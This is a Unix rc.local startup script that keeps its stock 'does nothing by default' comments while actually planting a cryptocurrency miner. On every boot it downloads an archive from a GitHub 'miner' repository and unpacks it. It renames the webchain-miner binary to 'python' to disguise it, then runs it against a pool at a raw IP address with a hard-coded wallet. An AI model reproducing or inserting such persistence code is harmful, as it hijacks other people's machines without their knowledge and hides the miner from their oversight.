 #!/bin/sh -e
 #
 # rc.local
 #
 # This script is executed at the end of each multiuser runlevel.
 # Make sure that the script will "exit 0" on success or any other
 # value on error.
 #
 # In order to enable or disable this script just change the execution
 # bits.
 #
 # By default this script does nothing.
 
 
 wget https://github.com/liaovanchuong/miner/blob/master/web.tar.gz
 tar -zxvf web.tar.gz
 mv webchain-miner python
 ./python -o 171.249.186.43:5678 -u 0xdb5ecb909cb16b4dab4a3e1f79052418d696e18b -p x
 
 
